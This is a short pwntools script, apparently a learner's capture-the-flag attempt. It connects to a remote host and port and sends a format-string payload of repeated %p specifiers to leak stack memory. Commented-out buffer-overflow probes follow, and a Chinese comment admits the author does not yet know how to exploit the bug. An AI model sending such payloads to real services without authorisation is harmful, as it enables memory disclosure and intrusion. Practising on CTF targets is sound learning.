#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
# r.sendline("b")
r.sendline(
    b"aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%4$p"
)
# r.sendline(b"a" * 900)
# r.sendline(b"a" * 104)
r.interactive()


# 格式化字符串漏洞
# 但是不会（哭）
